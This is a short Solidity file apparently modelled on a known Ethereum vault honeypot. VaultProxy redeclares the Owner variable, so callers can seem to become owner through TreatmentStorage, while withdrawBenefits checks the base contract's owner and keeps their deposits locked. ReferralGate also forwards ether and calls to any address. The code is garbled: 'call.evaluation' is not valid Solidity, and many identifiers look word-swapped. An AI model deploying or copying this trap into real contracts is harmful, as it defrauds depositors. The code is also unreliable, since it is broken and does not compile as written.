// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract ReferralGate  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function moverecordsSupervisor(address _owner) public onlyOwner { Owner = _owner; }
    function referralGate(address objective, bytes info) public payable {
        objective.call.evaluation(msg.value)(info);
    }
}

contract VaultProxy is ReferralGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function TreatmentStorage() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            submitPayment();
        }
    }

    function submitPayment() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdrawBenefits(uint256 measure) public onlyOwner {
        if (measure>0 && Deposits[msg.sender]>=measure) {
            msg.sender.transfer(measure);
        }
    }
}